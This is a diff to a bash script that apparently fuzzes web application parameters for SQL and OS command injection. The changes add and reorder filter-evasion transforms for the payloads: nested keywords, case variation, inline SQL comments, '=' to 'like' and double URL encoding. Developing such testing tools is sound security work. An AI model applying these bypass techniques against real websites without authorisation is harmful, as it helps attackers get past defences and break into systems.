@@ -15,23 +15,29 @@ ErrorString="foo123rewerwer435345345345"
 encodeme()
 {
 
-encodeoutput=`echo $encodeinput  | replace " " "%20" | replace "." "%2e" | replace "<" "%3c" | replace ">" "%3e" | replace "?" "%3f" | replace "+" "%2b" | replace "*" "%2a" | replace ";" "%3b" | replace ":" "%3a" | replace "(" "%28" | replace ")" "%29" | replace "," "%2c" | replace "/" "%2f"` 
+inputbuffer=$encodeinput
 
-if [ true = "$K" ] ; then
-	encodeoutput=`echo $encodeoutput | replace "=" "%20like%20"`
+if [ true = "$Y" ] ; then
+	inputbuffer=`echo $inputbuffer | replace " " "/**/"`
 fi
+
+if [ true = "$E" ] ; then
+	inputbuffer=`echo $inputbuffer | replace "=" " like "`
+fi
+
+if [ true = "$J" ] ; then #nesting
+	inputbuffer=`echo $inputbuffer | replace "select" "selselectect" | replace "union" "uniunionon" | replace "and" "anandd" | replace "order" "ororderder" |replace "or" "oorr" | replace "by" "bbyy" | replace "delay" "dedelaylay" | replace "dual" "dudualal" | replace "exec" "exexecec" | replace "from" "frfromom" | replace "having" "havhavinging" | replace "waitfor" "waitwaitforfor" | replace "case" "cacasese" | replace "when" "whwhenen" | replace "then" "ththenen" | replace "else" "elelsese" | replace "end" "eendnd" | replace "len" "llenen" | replace "ascii" "asasciicii" | replace "substr" "subsubstrstr" | replace "like" "lilikeke"`
+fi
+
+if [ true = "$U" ] ; then
+	inputbuffer=`echo $inputbuffer | replace "select" "sElEcT" | replace "union" "uNiOn" | replace "and" "aNd" | replace "or" "oR" | replace "order" "oRdEr" | replace "by" "bY" | replace "delay" "dElAy" | replace "dual" "dUaL" | replace "exec" "eXeC" | replace "from" "fRoM" | replace "having" "hAvInG" | replace "waitfor" "wAiTfOr" | replace "case" "cAsE" | replace "when" "wHeN" | replace "then" "tHeN" | replace "else" "eLsE" | replace "end" "eNd" | replace "len" "lEn" | replace "ascii" "aScIi" | replace "substr" "sUbStR" | replace "like" "lIkE"`
+fi
+
+encodeoutput=`echo $inputbuffer  | replace " " "%20" | replace "." "%2e" | replace "<" "%3c" | replace ">" "%3e" | replace "?" "%3f" | replace "+" "%2b" | replace "*" "%2a" | replace ";" "%3b" | replace ":" "%3a" | replace "(" "%28" | replace ")" "%29" | replace "," "%2c" | replace "/" "%2f"` 
 
 #if [ true = "$O" ] ; then
 #	encodeoutput=`echo $encodeoutput | replace "select" "se%2f%2a%2a%2flect" | replace "union" "uni%2f%2a%2a%2fon" | replace "and" "an%2f%2a%2a%2fd" | replace "or" "o%2f%2a%2a%2fr" | replace "order" "ord%2f%2a%2a%2fer" | replace "by" "b%2f%2a%2a%2fy" | replace "delay" "del%2f%2a%2a%2fay" | replace "dual" "du%2f%2a%2a%2fal" | replace "exec" "ex%2f%2a%2a%2fec" | replace "from" "fr%2f%2a%2a%2fom" | replace "having" "hav%2f%2a%2a%2fing" | replace "waitfor" "wai%2f%2a%2a%2ftfor" | replace "case" "ca%2f%2a%2a%2fse" | replace "when" "wh%2f%2a%2a%2fen" | replace "then" "th%2f%2a%2a%2fen" | replace "else" "el%2f%2a%2a%2fse" | replace "end" "en%2f%2a%2a%2fd" | replace "len" "le%2f%2a%2a%2fn" | replace "ascii" "as%2f%2a%2a%2fcii" | replace "substr" "su%2f%2a%2a%2fbstr"`
 #fi
-
-if [ true = "$U" ] ; then
-	encodeoutput=`echo $encodeoutput | replace "select" "sElEcT" | replace "union" "uNiOn" | replace "and" "aNd" | replace "or" "oR" | replace "order" "oRdEr" | replace "by" "bY" | replace "delay" "dElAy" | replace "dual" "dUaL" | replace "exec" "eXeC" | replace "from" "fRoM" | replace "having" "hAvInG" | replace "waitfor" "wAiTfOr" | replace "case" "cAsE" | replace "when" "wHeN" | replace "then" "tHeN" | replace "else" "eLsE" | replace "end" "eNd" | replace "len" "lEn" | replace "ascii" "aScIi" | replace "substr" "sUbStR" | replace "like" "lIkE"`
-fi
-
-if [ true = "$Y" ] ; then
-	encodeoutput=`echo $encodeoutput | replace "%20" "%2f%2a%2a%2f"`
-fi
 
 if [ true = "$V" ] ; then #double URL encoding
 	encodeoutput=`echo $encodeoutput | replace "%" "%25"`
@@ -865,7 +871,7 @@ while [[ $oflag -lt $horiz ]] ; do
 		oflag=40
 	fi
 
-	echo "debug true $request"
+	#echo "debug true $request"
 		
 	encodeinput=$badparams
 	encodeme
@@ -1399,10 +1405,11 @@ V=false
 U=false
 O=false
 K=false
+J=false
 
 #################command switch parser section#########################
 
-while getopts l:c:t:nsqehx:d:bu:P:v:L:M:Q:I:T:C:rWS:ABjYfoD:FGHRZYVUOK namer; do
+while getopts l:c:t:nsqehx:d:bu:P:v:L:M:Q:I:T:C:rWS:ABjYfoD:FGHRZYVUOKJE namer; do
     case $namer in 
     l)  #path to burp log to parse
         burplog=$OPTARG
@@ -1531,8 +1538,14 @@ while getopts l:c:t:nsqehx:d:bu:P:v:L:M:Q:I:T:C:rWS:ABjYfoD:FGHRZYVUOK namer; do
     O) # Filter Evasion MYSQL comments in SQL commands
 	O=true  
 	;;
-    K) # Filter Evasion '=' => 'like'
+    K) # ??? wtf -K does not work???
 	K=true  
+	;;
+    J) # Filter Evasion nesting 'select' => 'selselectect'
+	J=true  
+	;;
+    E) # Filter Evasion '=' => 'like'
+	E=true  
 	;;
     esac
 done
@@ -1562,12 +1575,13 @@ if [ true = "$h" ] || ["$1" == ""] 2>/dev/null ; then
         echo "  -b OS Command injection"
         echo "  -C <path to payload list text file> Use a custom payload list. Where the character 'X' is included in a payload, it may be replaced with a time delay value."
         #echo "  -Y XSS injection (very basic!)"
-	echo "   Payload modifiers:"
-	echo "  -Y Filter evasion: inline SQL comment instead of spaces    ' ' => '/**/'"
-	echo "  -V Filter evasion: double URL encoding                     '%27' => '%2527'"
-	echo "  -U Filter evasion: camel case                              'select' => 'sElEcT'"
-	#echo "  -O Filter evasion: MYSQL inline comments                   'select' => 'se/**/lect' "
-	#echo "  -K Filter evasion: replace equals operator with like       '=' => 'like' "
+	echo "Optional payload modifiers:                Before     After          Breaks normal query?"
+	echo "  -Y Inline SQL comment instead of spaces  ' '        '/**/'         No                  "              
+	echo "  -V Double URL encoding                   '%27'      '%2527'        ?                   "
+	echo "  -U Case variation                        'select'   'sElEcT'       No                  "
+	#echo "  -O MYSQL inline comments                  'select'  'se/**/lect'  No                  "
+	echo "  -E Replace equals operator with like     '='        'like'         No                  "
+	echo "  -J Nesting                               'select'   'selselectect' Yes                 "
 	echo "  -A Prepend payloads with %00"
 	echo "  -B Prepend payloads with %0d%0a"
 	echo "  -W HTTP Method Swapping mode: GET requests are converted to POSTs and vice-versa. These new requests are tested IN ADDITION to the original."
